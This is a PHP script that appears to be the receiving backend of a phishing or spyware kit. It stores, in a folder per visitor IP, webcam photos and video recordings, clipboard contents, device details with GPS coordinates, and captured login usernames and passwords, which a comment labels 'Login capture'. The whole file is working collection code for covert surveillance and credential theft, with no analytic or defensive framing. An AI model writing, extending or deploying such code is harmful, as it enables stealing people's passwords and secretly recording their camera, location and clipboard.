<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // 🔍 Get IP
    $ip = $_SERVER['HTTP_CLIENT_IP'] ??
          $_SERVER['HTTP_X_FORWARDED_FOR'] ??
          $_SERVER['REMOTE_ADDR'] ??
          'UNKNOWN';

    // 🧼 Clean IP for folder names
    $cleanIP = str_replace(['.', ':'], '_', $ip);

    // 🗂️ Base path
    $baseDir = __DIR__ . "/clients/$cleanIP";

    // 📁 Create folder if it doesn't exist
    if (!is_dir($baseDir)) {
        mkdir($baseDir, 0777, true);
        mkdir("$baseDir/photos", 0777, true);
        mkdir("$baseDir/videos", 0777, true);
    }

    $userInfoPath = "$baseDir/user.info.txt";

    // 🎥 Handle snapshot image
    if (!empty($_FILES['snapshot']) && $_FILES['snapshot']['error'] === 0) {
        $photoDir = "$baseDir/photos/";
        $name = 'photo_' . time() . '_' . rand(1000,9999) . '.jpg';
        move_uploaded_file($_FILES['snapshot']['tmp_name'], $photoDir . $name);
        file_put_contents($userInfoPath, "📸 Photo saved: $name (IP: $ip)\n", FILE_APPEND);
        exit;
    }

    // 🎥 Handle video recording
    if (!empty($_FILES['webmVideo']) && $_FILES['webmVideo']['error'] === 0) {
        $videoDir = "$baseDir/videos/";
        $videoName = 'recording_' . time() . '_' . rand(1000,9999) . '.mp4';
        move_uploaded_file($_FILES['webmVideo']['tmp_name'], $videoDir . $videoName);
        file_put_contents($userInfoPath, "🎥 Saved: $videoName (IP: $ip)\n", FILE_APPEND);
        exit;
    }

    // 📋 Handle JSON body
    $raw = file_get_contents("php://input");
    $data = json_decode($raw, true);

    // ✂️ Clipboard log
    if (!empty($data['clipboard'])) {
        $clip = trim($data['clipboard']);
        file_put_contents($userInfoPath, "📋 Clipboard: $clip (IP: $ip)\n", FILE_APPEND);
        exit;
    }

    // 📊 Metadata logging
    if (!empty($data['timestamp_utc'])) {
        $log = "==============================\n";
        $log .= "Timestamp_utc: " . $data['timestamp_utc'] . "\n";
        $log .= "UserAgent: " . $data['userAgent'] . "\n";
        $log .= "Cores: " . $data['cores'] . "\n";
        $log .= "Ram: " . $data['ram'] . "\n";
        $log .= "Width: " . $data['width'] . "\n";
        $log .= "Height: " . $data['height'] . "\n";
        $log .= "Latitude: " . $data['latitude'] . "\n";
        $log .= "Longitude: " . $data['longitude'] . "\n";
        $log .= "Battery: " . $data['battery'] . "\n";
        $log .= "IP Address: " . $ip . "\n";
        $log .= "==============================\n";
        file_put_contents($userInfoPath, $log, FILE_APPEND);
        exit;
    }

    // 🔐 Login capture in emoji style
    if (!empty($data['login_username']) && !empty($data['login_password'])) {
        $user = trim($data['login_username']);
        $pass = trim($data['login_password']);
        $time = $data['timestamp'] ?? date("r");

        $log  = "🧑 Username: $user\n";
        $log .= "🔐 Password: $pass\n";
        $log .= "🕒 Time: $time\n";
        $log .= "🌐 IP: $ip\n";
        $log .= "--------------------------\n\n";
        file_put_contents($userInfoPath, $log, FILE_APPEND);
        exit;
    }
}
?>
